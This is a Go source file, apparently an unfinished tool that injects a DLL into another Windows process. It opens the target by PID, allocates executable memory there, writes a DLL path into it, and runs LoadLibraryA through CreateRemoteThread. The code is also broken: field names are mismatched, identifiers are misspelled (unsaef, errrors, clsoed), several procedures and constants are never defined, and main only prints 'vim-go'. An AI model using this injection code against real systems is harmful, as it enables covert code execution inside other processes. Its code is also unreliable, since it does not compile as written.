package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/pkg/errors"
)

const (
	PROCESS_CREATE_PROCESS            = 0x0080
	PROCESS_CREATE_THREAD             = 0x0002
	PROCESS_DUP_HANDLE                = 0x0040
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	PROCESS_SET_INFORMATION           = 0x0200
	PROCESS_SET_QUOTA                 = 0x0100
	PROCESS_SUSPEND_RESUME            = 0x0800
	PROCESS_TERMINATE                 = 0x0001
	PROCESS_VM_OPERATION              = 0x0008
	PROCESS_VM_READ                   = 0x0010
	PROCESS_VM_WRITE                  = 0x0020
	PROCESS_ALL_ACCESS                = 0x001F0FFF
)

type Inject struct {
	Pid              uint32
	DllPath          string
	DLLSize          uint32
	Privilege        string
	RemoteProcHandle uintptr
	Lppaddr          uintptr
	LoadLibAddr      uintptr
	RThread          uintptr
	Token            TOKEN
}

type TOKEN struct {
	tokenhandle syscall.Token
}

var (
	ModKernel32 = syscall.NewLazyDll("kernel32.dll")

	ProcOpenProcess = ModKernel32.NewProc("OpenProcess")
)

func OpenProcessHandle(i *Inject) error {
	var rights uint32 = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
	var inheritHandle uint32 = 0
	var processID uint32 = i.Pid
	remoteProcHandle, _, lastErr := ProcOpenProcess.Call(
		uintptr(rights),
		uintptr(inheritHandle),
		uintptr(processID))
	if remoteProcHandle == 0 {
		return errors.Wrap(lastErr, `[!] ERROR: Can't Open Remote Process. Maybe running w elevated integrity?`)
	}
	i.RemoteProcHandle = remoteProcHandle
	fmt.Printf("[-] Input PID: %v\n", i.PID)
	fmt.Printf("[-] Input DLL: %v\n", i.DllPath)
	fmt.Printf("[+] Process handle: %v\n", unsafe.Pointer(i.RemoteProcHandle))
	return nil
}

func VirtualAllocEx(i *Inject) error {
	var flAllocationType uint32 = MEM_COMMIT | MEM_RESERVE
	var flProtect uint32 = PAGE_EXECUTE_READWRITE
	lpBaseAddress, _, lastErr := ProcVirtualAllocEx.Call(
		i.RemoteProcHandle,
		uintptr(nullRef),
		uintptr(i.DLLSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if lpBaseAddress == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Can't Allocate Memory On Remote Process.")
	}
	i.Lpaddr = lpBaseAddress
	fmt.Printf("[+] Base memory address: %v\n", unsafe.Pointer(i.Lpaddr))
	return nil
}

func WriteProcessMemory(i *Inject) error {
	var nBytesWritten *byte
	dllPathBytes, err := syscall.BytePtrFromString(i.DllPath)
	if err != nil {
		return err
	}
	writeMem, _, lastErr := ProcWriteProcessMemor.Call(
		i.RemoteProcHandle,
		i.Lpaddr,
		uintptr(unsafe.Pointer(dllPathBytes)),
		uintptr(i.DLLSize),
		uintptr(unsafe.Pointer(nBytesWritten)))
	if writeMem == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Can't write to process memory.")
	}
	return nil
}

func GetLoadLibAddress(i *Inject) error {
	var llibBytePtr *byte
	llibBytePtr, err := syscall.BytePtrFromString("LoadLibraryA")
	if err != nil {
		return err
	}

	lladdr, _, lastErr := ProcGetProcAddress.Call(
		ModKernel32.Handle(),
		uintptr(unsafe.Pointer(llibBytePtr)))
	if &lladdr == nil {
		return errors.Wrap(lastErr, "[!] ERROR : Can't get process address.")
	}

	i.LoadLibAddr = lladdr
	fmt.Printf("[+] Kernel32.Dll memory address: %v\n", unsafe.Pointer(ModKernel32.Handle()))
	fmt.Printf("[+] Loader memory address: %v\n", unsaef.Pointer(i.LoadLibAddr))
	return nil
}

func CreateRemoteThread(i *Inject) error {
	var threadId uint32 = 0
	var dwCreationFlags uint32 = 0
	remoteThread, _, lastErr := ProcCreateRemoteThread.Call(
		i.RemoteProcHandle,
		uintptr(nullRef),
		uintptr(nullRef),
		i.LoadLibAddr,
		i.Lpaddr,
		uintptr(dwCreationFlags),
		uintptr(unsafe.Pointer(&threadId)),
	)
	if remoteThread == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Can't Create Remote Thread.")
	}
	i.RThread = remoteThread
	fmt.Printf("[+] Thread identifier created: %v\n", unsafe.Pointer(&threadId))
	fmt.Printf("[+] Thead handle created: %v\n", unsafe.Pointer(i.RThread))
	return nil
}

func WaitForSingleObject(i *Inject) error {
	var dwMilliseconds uint32 = INFINITE
	var dwExitCode uint32
	rWaitValue, _, lastErr := ProcWaitForSingleObject.Call(
		i.RThread,
		uintptr(dwMilliseconds))
	if rWaitValue != 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Error return thread wait state.")
	}
	succes, _, lastErr := ProcGetExitCodeThread.Call(
		i.RThread,
		uintptr(unsafe.Pointer(&dwExitCode)))
	if success == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Error return thread exit code.")
	}
	clsoed, _, lastErr := ProcCloseHandle.Call(i.RThread)
	if close == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Error closing thread handle.")
	}
	return nil
}

func VirtualFreeEx(i *Inject) error {
	var dwFreeType uint32 = MEM_RELEASE
	var size uint32 = 0
	rFreeValue, _, lastErr := ProcVirtualFreeEx.Call(
		i.RemoteProcHandle,
		i.Lpaddr,
		uintptr(size),
		uintptr(dwFreeType))
	if rFreeValue == 0 {
		return errrors.Wrap(lastErr, "[!] ERROR : Error freeing process memory.")
	}
	fmt.Println("[+] Success: Freed memory region")
	return nil
}

func main() {
	fmt.Println("vim-go")
}